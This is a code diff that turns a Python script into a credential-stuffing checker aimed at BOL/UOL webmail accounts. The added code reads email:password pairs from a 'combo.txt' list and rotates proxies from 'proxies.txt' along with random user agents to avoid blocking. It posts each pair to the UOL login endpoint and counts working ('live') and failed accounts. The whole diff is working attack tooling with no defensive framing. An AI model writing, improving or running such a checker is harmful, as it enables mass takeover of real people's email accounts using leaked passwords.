@@ -3,6 +3,13 @@
 
 import requests
 import random
+import time
+
+queue = []
+count_checkeds = 0
+count_lives = 0
+count_dies = 0
+count_errors = 0
 
 LOGIN_REQUEST_HEADERS = {
     "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
@@ -26,44 +33,93 @@ USER_AGENT_LIST = [
 ]
 
 
-def parse_error(body):
+def load():
+    global queue, proxies
+    try:
+        queue = open('combo.txt', 'r').readlines()
+        proxies = open('proxies.txt', 'r').readlines()
+    except:
+        return exit("[x] Can't read 'combo.txt'")
+
+    if len(proxies) < 5:
+        exit("[x] you need at least 5 proxies in the 'proxies.txt' file")
+    if len(queue) <= 0:
+        exit("[x] 'combo.txt' file is empty.")
+    pass
+
+
+def parse_error(body, email, password):
+    global proxies
     try:
         x = str(body).split('<!-- ')[1]
         errorMessage = x.split(' -->')[0]
         return "API RESPONSE: "+errorMessage
     except:
+        newProxy = random.choice(proxies)
+        login(email, password, newProxy)  # retry
         return "Unknow error."
 
 
-def login(email, password):
+def login(email, password, proxy):
+    global count_checkeds, count_dies, count_lives, count_errors
     if not email.endswith('bol.com.br'):
         return print("[x] %s %s -> Email provider not supported." % (email, password))
+
+    loginRequestProxy = {
+        'http':  'http://'+proxy,
+        'https':  'https://'+proxy
+    }
+    # clear strings
+    email = email.replace(' ', '').replace('\r', '').replace(
+        '\n', '')
+    formatedEmail = email.replace('@bol.com.br', '')
+    password = password.replace(' ', '').replace('\r', '').replace('\n', '')
 
     userAgent = random.choice(USER_AGENT_LIST)
 
     loginPageReq = requests.get(
-        'https://email.bol.uol.com.br/login', headers={'user-agent': userAgent})
+        'https://email.bol.uol.com.br/login', proxies=loginRequestProxy, headers={'user-agent': userAgent})
     loginPageCookies = loginPageReq.cookies.get_dict()
 
     loginPayload = "skin=bol-default&dest=WEBMAIL&deviceId=&user=%s&pass=%s" % (
-        email, password)
+        formatedEmail, password)
     loginRequest = requests.post(
-        'https://visitante.acesso.uol.com.br/login.html', data=loginPayload, headers=LOGIN_REQUEST_HEADERS, cookies=loginPageCookies)
+        'https://visitante.acesso.uol.com.br/login.html', proxies=loginRequestProxy, data=loginPayload, headers=LOGIN_REQUEST_HEADERS, cookies=loginPageCookies)
+
+    count_checkeds = count_checkeds + 1
 
     if 'openApp(dna.uid);' in loginRequest.text:
         print("[-] %s %s -> Logged in successfully.")
+        count_lives = count_lives+1
         pass
     elif 'throwErrorStatus(' in loginRequest.text:
         print("[!] %s %s -> %s" % (email, password,
-                                   parse_error(loginRequest.text)))
+                                   parse_error(loginRequest.text, email, password)))
+        count_dies = count_dies+1
         pass
     else:
         print("[!] %s %s -> Request error." % (email, password))
+        count_errors = count_errors + 1
     pass
 
 
+def worker():
+    global queue, proxies
+    while len(queue) > 0:
+        proxy = random.choice(proxies)
+        lastAccOfQueue = str(queue.pop()).split(
+            ":")  # get last acc and remove it
+        userEmail = lastAccOfQueue[0]
+        userPassword = lastAccOfQueue[1]
+        login(userEmail, userPassword, proxy)
+        pass
+    pass
+    time.sleep(1.0)
+
+
 def main():
-    login("test@bol.com.br", "test")
+    load()
+    worker()
     pass
 
 
